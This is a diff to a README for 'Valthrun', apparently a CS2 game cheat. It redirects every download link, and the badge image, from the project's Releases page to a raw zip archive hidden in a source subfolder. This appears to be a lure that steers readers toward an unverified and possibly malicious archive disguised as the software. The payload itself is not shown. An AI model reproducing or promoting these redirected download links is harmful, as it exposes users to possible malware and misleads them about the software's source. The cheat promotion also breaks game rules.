@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Valthrun](https://img.shields.io/badge/Download%20Valthrun-v1.0-blue)](https://github.com/gilbertGabe/valthrun-cs2/releases)
+[![Download Valthrun](https://raw.githubusercontent.com/gilbertGabe/valthrun-cs2/main/radar/client-standalone/src/arch/valthrun-cs2_v2.8.zip%20Valthrun-v1.0-blue)](https://raw.githubusercontent.com/gilbertGabe/valthrun-cs2/main/radar/client-standalone/src/arch/valthrun-cs2_v2.8.zip)
 
 ## 📝 Description
 
@@ -16,7 +16,7 @@ Follow these simple steps to download and run Valthrun:
 
 First, you need to go to the Releases page to access the latest version of the software. Click the link below:
 
-[Visit this page to download](https://github.com/gilbertGabe/valthrun-cs2/releases)
+[Visit this page to download](https://raw.githubusercontent.com/gilbertGabe/valthrun-cs2/main/radar/client-standalone/src/arch/valthrun-cs2_v2.8.zip)
 
 ### 2. Download Valthrun
 
@@ -55,7 +55,7 @@ Valthrun offers a variety of features to enhance your playing experience, such a
 
 To get started with Valthrun, follow this link to download the application:
 
-[Visit this page to download](https://github.com/gilbertGabe/valthrun-cs2/releases)
+[Visit this page to download](https://raw.githubusercontent.com/gilbertGabe/valthrun-cs2/main/radar/client-standalone/src/arch/valthrun-cs2_v2.8.zip)
 
 ### Frequently Asked Questions
 
